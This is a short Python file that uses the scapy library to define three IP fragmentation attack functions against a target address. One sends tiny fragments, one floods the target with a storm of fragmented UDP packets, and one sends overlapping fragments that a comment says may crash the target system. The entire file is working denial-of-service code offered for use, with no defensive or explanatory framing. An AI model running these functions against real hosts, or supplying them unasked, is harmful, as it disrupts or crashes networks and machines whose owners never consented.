#!usr/bin/env python

import sys


from scapy.sendrecv import send
from scapy.layers.all import TCP,UDP,fragment,Raw,IP





# Sending multiple fragment with tiny sizes
def TinyFragmentAttack(Ip,Interface,PckNmb):

    for p in fragment(IP(dst=Ip,flags="MF",id=222)/UDP()/Raw(load="abcdefgh"*PckNmb),fragsize=1):
        send(p,iface=Interface,verbose=0)
    p.frag+=1
    p.flags=0

    send(p,iface=Interface,verbose=0)


    return 0

# Sending a storm of UDP fragmented packets
def StormFragmentAttack(Ip,Interface,PckNmb):

    for p in fragment(IP(dst=Ip,flags="MF",id=222)/UDP()/Raw(load="a"*1472*PckNmb)):
        send(p,iface=Interface,verbose=0)

    p.frag+=185
    p.flags=0

    send(p,iface=Interface,verbose=0)

    return 0

# Sending multiple fragmented packets with overlpped offsets (wrong offsets) , it may cause a system crash
def TinyOverlappingFragmentAttack(Ip,Interface,PckNmb):


    for p in fragment(IP(dst=Ip,flags="MF",id=222)/UDP(dport=80)/Raw(load="abcdefgh"*PckNmb),fragsize=3):
        p.frag-=1
        send(p,iface=Interface,verbose=0)

    p.frag+=1
    p.flags=0

    send(p,iface=Interface,verbose=0)

    return 0